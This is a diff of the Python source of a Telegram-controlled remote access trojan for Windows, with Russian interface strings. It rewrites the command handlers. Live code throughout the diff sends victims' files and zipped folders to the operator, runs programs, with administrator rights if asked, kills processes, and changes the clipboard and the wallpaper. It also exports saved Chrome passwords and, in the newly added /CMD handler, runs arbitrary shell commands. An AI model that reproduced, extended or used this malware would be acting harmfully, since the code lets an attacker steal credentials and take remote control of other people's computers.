+  bot.reply_to(command, '*Файл загружен на компьютер!*\n \n`C:/ProgramData/Files/' + file_info.file_path + '`', parse_mode="Markdown")
  except FileNotFoundError:
-  bot.reply_to(message, '*Формат файла не поддерживается*', parse_mode="Markdown")
+  bot.reply_to(command, '*Формат файла не поддерживается*', parse_mode="Markdown")
  except:
-  bot.reply_to(message, '*Не удалось загрузить файл*', parse_mode="Markdown")
+  bot.reply_to(command, '*Не удалось загрузить файл*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Download'])
-def download(message):
+@bot.message_handler(regexp='Download')
+def download(command):
  try:
-  user_msg = "{0}".format(message.text)
-  download = open(os.getcwd() + '\\' + user_msg.split("/Download ")[1], 'rb')
-  bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
-  bot.send_chat_action(message.chat.id, 'upload_document')
-  bot.send_document(message.chat.id, download)
+  msg = re.split('/Download ', command.text, flags=re.I)[1]
+  download = open(os.getcwd() + '\\' + msg, 'rb')
+  bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'upload_document')
+  bot.send_document(command.chat.id, download)
  except FileNotFoundError:
-  bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
   try:
-    bot.send_message(message.chat.id, '*Собираем...*', parse_mode="Markdown")
-    shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/Download ")[1],
+    bot.send_message(command.chat.id, '*Собираем...*', parse_mode="Markdown")
+    shutil.make_archive('C:\\ProgramData\\' + msg,
                             'zip',
                             os.getcwd(),
-                            user_msg.split("/Download ")[1])
-    bot.send_chat_action(message.chat.id, 'upload_document')
-    file = open('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip', 'rb')
-    bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
-    bot.send_document(message.chat.id, file)
+                            msg)
+    bot.send_chat_action(command.chat.id, 'upload_document')
+    file = open('C:\\ProgramData\\' + msg + '.zip', 'rb')
+    bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
+    bot.send_document(command.chat.id, file)
     file.close()
-    os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
+    os.remove('C:\\ProgramData\\' + msg + '.zip')
   except:
     try:
         file.close()
-        os.remove('C:\\ProgramData\\' + user_msg.split("/Download ")[1] + '.zip')
-        bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
+        os.remove('C:\\ProgramData\\' + msg + '.zip')
+        bot.send_message(command.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
     except:
-        bot.send_message(message.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")
+        bot.send_message(command.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['download'])
-def download(message):
+@bot.message_handler(regexp='Run')
+def run(command):
  try:
-  user_msg = "{0}".format(message.text)
-  download = open(os.getcwd() + '\\' + user_msg.split("/download ")[1], 'rb')
-  bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
-  bot.send_chat_action(message.chat.id, 'upload_document')
-  bot.send_document(message.chat.id, download)
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/Run ', command.text, flags=re.I)[1]
+  os.startfile(os.getcwd() + '\\' + msg)
+  bot.send_message(command.chat.id, 'Файл *' + msg + '* открыт!', parse_mode="Markdown")
  except FileNotFoundError:
-  bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
-  try:
-    bot.send_message(message.chat.id, '*Собираем...*', parse_mode="Markdown")
-    shutil.make_archive('C:\\ProgramData\\' + user_msg.split("/download ")[1],
-                            'zip',
-                            os.getcwd(),
-                            user_msg.split("/download ")[1])
-    bot.send_chat_action(message.chat.id, 'upload_document')
-    file = open('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip', 'rb')
-    bot.send_message(message.chat.id, '*Отправляем...*', parse_mode="Markdown")
-    bot.send_document(message.chat.id, file)
-    file.close()
-    os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
-  except:
-    try:
-        file.close()
-        os.remove('C:\\ProgramData\\' + user_msg.split("/download ")[1] + '.zip')
-        bot.send_message(message.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
-    except:
-        bot.send_message(message.chat.id, '*Введите название файла\n \n› /Download*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Run'])
-def run(message):
+@bot.message_handler(regexp='RunAS')
+def runas(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.startfile(os.getcwd() + '\\' + user_msg.split("/Run ")[1])
-  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/Run ")[1] + '* открыт!', parse_mode="Markdown")
- except FileNotFoundError:
- 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
- except:
- 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
-
-@bot.message_handler(commands=['run'])
-def run(message):
- try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.startfile(os.getcwd() + '\\' + user_msg.split("/run ")[1])
-  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/run ")[1] + '* открыт!', parse_mode="Markdown")
- except FileNotFoundError:
- 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
- except:
-    bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
-
-@bot.message_handler(commands=['RunAS'])
-def runas(message):
- try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.startfile(os.getcwd() + '\\' + user_msg.split("/RunAS ")[1], 'runas')
-  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/RunAS ")[1] + '* открыт!', parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/RunAS ', command.text, flags=re.I)[1]
+  os.startfile(os.getcwd() + '\\' + msg, 'runas')
+  bot.send_message(command.chat.id, 'Файл *' + msg + '* открыт!', parse_mode="Markdown")
  except OSError:
- 	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except FileNotFoundError:
- 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except:
- 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
+ 	bot.send_message(command.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['runas'])
-def runas(message):
- try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.startfile(os.getcwd() + '\\' + user_msg.split("/runas ")[1], 'runas')
-  bot.send_message(message.chat.id, 'Файл *' + user_msg.split("/runas ")[1] + '* открыт!', parse_mode="Markdown")
- except OSError:
- 	bot.send_message(message.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
- except FileNotFoundError:
- 	bot.send_message(message.chat.id, '*Файл не найден*', parse_mode="Markdown")
- except:
- 	bot.send_message(message.chat.id, '*Введите название файла\n \n› /Run • /RunAS*', parse_mode="Markdown")
-
-@bot.message_handler(commands=['PWD', 'pwd'])
-def pwd(command):
+@bot.message_handler(regexp='Ls')
+def ls(command):
  try:
   bot.send_chat_action(command.chat.id, 'typing')
   dirs = '\n``'.join(os.listdir(path="."))
@@ -1015,132 +926,104 @@ def pwd(command):
   except:
     pass
 
-@bot.message_handler(commands=['Cancel', 'cancel'])
+@bot.message_handler(regexp='Cancel')
 def cancelfiles(command):
  bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")
 
-@bot.message_handler(commands=['Tasklist', 'tasklist'])
+@bot.message_handler(regexp='Tasklist')
 def tasklist(command):
  try:
   bot.send_chat_action(command.chat.id, 'typing')
-  procs = [proc.name().replace('.exe', '') for proc in psutil.process_iter()]
-  sprocs = '\n'.join(procs)
-  bot.send_message(command.chat.id, '`' + sprocs + '`', parse_mode="Markdown")
+  prs = Popen('tasklist', stdout=PIPE).stdout.readlines()
+  pr_list = [prs[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(prs))]
+  pr_string = '\n'.join(pr_list)
+  bot.send_message(command.chat.id, '`' + pr_string + '`', parse_mode="Markdown")
  except:
-  pass
+  bot.send_message(command.chat.id, '*Не удалось получить список процессов*')
 
-@bot.message_handler(commands=['Taskkill', 'taskkill'])
-def taskkill(message):
+@bot.message_handler(regexp='Taskkill')
+def taskkill(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  os.system("taskkill /f /im  " + user_msg.split(" ")[1] + '.exe')
-  bot.send_message(message.chat.id, "Процесс *" + user_msg.split(" ")[1] + "* остановлен!", parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/Taskkill ', command.text, flags=re.I)[1]
+  subprocess.Popen('taskkill /f /im ' + msg + '.exe')
+  bot.send_message(command.chat.id, "Процесс *" + msg + "* остановлен!", parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, 
+  bot.send_message(command.chat.id, 
   '*Введите название процесса'
   '\n'
-  '\n› /Taskkill*'
+  '\n› /Taskkill'
   '\n'
-  '\n*Активное окно*'
+  '\nАктивное окно*'
   '\n'
   '\n`' + GetWindowText(GetForegroundWindow()) + '`',
   reply_markup=main13, parse_mode="Markdown")
 
-@bot.message_handler(commands=['Message'])
-def message(message):
+@bot.message_handler(regexp='Message')
+def message(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  ctypes.windll.user32.MessageBoxW(0, user_msg.split("/Message ")[1], u'Information', 0x10)
-  bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/Message ', command.text, flags=re.I)[1]
+  ctypes.windll.user32.MessageBoxW(0, msg, u'Information', 0x10)
+  bot.reply_to(command, '*Сообщение отправленно!*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['message'])
-def message(message):
+@bot.message_handler(regexp='OpenURL')
+def openurl(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  ctypes.windll.user32.MessageBoxW(0, user_msg.split("/message ")[1], u'Information', 0x10)
-  bot.reply_to(message, '*Сообщение отправленно!*', parse_mode="Markdown")
- except:
-  bot.send_message(message.chat.id, '*Введите сообщение\n \n› /Message*', parse_mode="Markdown")
-
-@bot.message_handler(commands=['OpenURL', 'openurl'])
-def openurl(message):
- try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  url = user_msg.split(" ")[1]
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/OpenURL ', command.text, flags=re.I)[1]
+  url = msg
   webbrowser.open_new_tab(url)
-  bot.reply_to(message, '*Ссылка открыта!*', parse_mode="Markdown")
+  bot.reply_to(command, '*Ссылка открыта!*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id, '*Вставьте ссылку\n \n› /OpenURL*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Вставьте ссылку\n \n› /OpenURL*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
+@bot.message_handler(regexp='Wallpapers')
 def wallpapers(command):
  bot.send_message(command.chat.id, '*Отправьте фотографию*', parse_mode="Markdown")
 
 @bot.message_handler(content_types=['photo'])
-def wallpapers(message):
+def wallpapers(command):
  try:
-  file_info = bot.get_file(message.photo[len(message.photo)-1].file_id)
+  file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
   downloaded_file = bot.download_file(file_info.file_path)
   src='C:\\ProgramData\\Files\\'+file_info.file_path;
   with open(src, 'wb') as new_file:
     new_file.write(downloaded_file)
   ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\\ProgramData\\Files\\' + file_info.file_path, 0)
-  bot.reply_to(message, '*Фотография установлена на обои!*', parse_mode="Markdown")
+  bot.reply_to(command, '*Фотография установлена на обои!*', parse_mode="Markdown")
   time.sleep(3)
   os.remove('C:\\ProgramData\\Files\\' + file_info.file_path)
  except:
-  bot.reply_to(message, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")
+  bot.reply_to(command, '*Не удалось загрузить фотографию*', reply_markup=menu, parse_mode="Markdown")
 
-@bot.message_handler(commands=['Voice', 'voice'])
+@bot.message_handler(regexp='Voice')
 def voice(command):
  bot.send_message(command.chat.id, '*Введите текст\n \n› /Say*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Say'])
-def say(message):
+@bot.message_handler(regexp='Say')
+def say(command):
  try:
   from win32com.client import constants, Dispatch
-  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
-  user_msg = "{0}".format(message.text)
+  bot.reply_to(command, '*Воспроизводим...*', parse_mode="Markdown")
+  msg = re.split('/Say ', command.text, flags=re.I)[1]
   devices = AudioUtilities.GetSpeakers()
   interface = devices.Activate(
       IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
   volume = cast(interface, POINTER(IAudioEndpointVolume))
   volume.SetMasterVolumeLevel(-0.0, None)
   speaker = Dispatch("SAPI.SpVoice")
-  speaker.Speak(user_msg.split("/Say")[1])
+  speaker.Speak(msg)
   del speaker
-  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Готово!*', parse_mode="Markdown")
  except:
   pass
 
-@bot.message_handler(commands=['say'])
-def say(message):
- try:
-  from win32com.client import constants, Dispatch
-  bot.reply_to(message, '*Воспроизводим...*', parse_mode="Markdown")
-  user_msg = "{0}".format(message.text)
-  devices = AudioUtilities.GetSpeakers()
-  interface = devices.Activate(
-      IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-  volume = cast(interface, POINTER(IAudioEndpointVolume))
-  volume.SetMasterVolumeLevel(-0.0, None)
-  speaker = Dispatch("SAPI.SpVoice")
-  speaker.Speak(user_msg.split("/say")[1])
-  del speaker
-  bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
- except:
-  pass
-
-@bot.message_handler(commands=['Passwords', 'passwords'])
+@bot.message_handler(regexp='Passwords')
 def passwords(command):
  try:
-  bot.send_chat_action(command.chat.id, 'upload_document')
   from cryptography.hazmat.backends import default_backend
   from cryptography.hazmat.primitives.ciphers import (
       Cipher, algorithms, modes)
@@ -1271,6 +1154,7 @@ def passwords(command):
       Main.get_chrome_db()
       Main.save_passwords()
       try:
+       bot.send_chat_action(command.chat.id, 'upload_document')
        passwords = open('C:\\ProgramData\\Passwords.txt')
        bot.send_document(command.chat.id, passwords)
        passwords.close()
@@ -1280,15 +1164,15 @@ def passwords(command):
  except:
  	bot.send_message(command.chat.id, '*Паролей не найдено*', parse_mode="Markdown")
 
-@bot.message_handler(commands=['Clipboard'])
-def clipboard(message):
+@bot.message_handler(regexp='Clipboard')
+def clipboard(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  pyperclip.copy(user_msg.split("/Clipboard ")[1])
-  bot.send_message(message.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
+  bot.send_chat_action(command.chat.id, 'typing')
+  msg = re.split('/Clipboard ', command.text, flags=re.I)[1]
+  pyperclip.copy(msg)
+  bot.send_message(command.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
  except:
-  bot.send_message(message.chat.id,
+  bot.send_message(command.chat.id,
   '*Введите текст'
   '\n'
   '\n› /Clipboard'
@@ -1298,23 +1182,19 @@ def clipboard(message):
   '\n« `' + pyperclip.paste() + '` »',
   parse_mode="Markdown")
 
-@bot.message_handler(commands=['clipboard'])
-def clipboard(message):
+@bot.message_handler(regexp='CMD')
+def cmd(command):
  try:
-  bot.send_chat_action(message.chat.id, 'typing')
-  user_msg = "{0}".format(message.text)
-  pyperclip.copy(user_msg.split("/clipboard ")[1])
-  bot.send_message(message.chat.id, '*Содержание буфера обмена изменено!*', parse_mode="Markdown")
+  msg = re.split('/CMD ', command.text, flags=re.I)[1]
+  ipconfig_res = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+  lines = []
+  for line in ipconfig_res.stdout.readlines():
+      line = line.strip()
+      if line:
+          lines.append(line.decode('cp866'))
+  bot.send_message(command.chat.id, ('\n'.join(lines)))
  except:
-  bot.send_message(message.chat.id,
-  '*Введите текст'
-  '\n'
-  '\n› /clipboard'
-  '\n'
-  '\nБуфер обмена*'
-  '\n'
-  '\n« `' + pyperclip.paste() + '` »',
-  parse_mode="Markdown")
+  bot.send_message(command.chat.id, '*Введите команду\n\n› /CMD*', parse_mode="Markdown")
 
 try:
   bot.polling(none_stop=True)
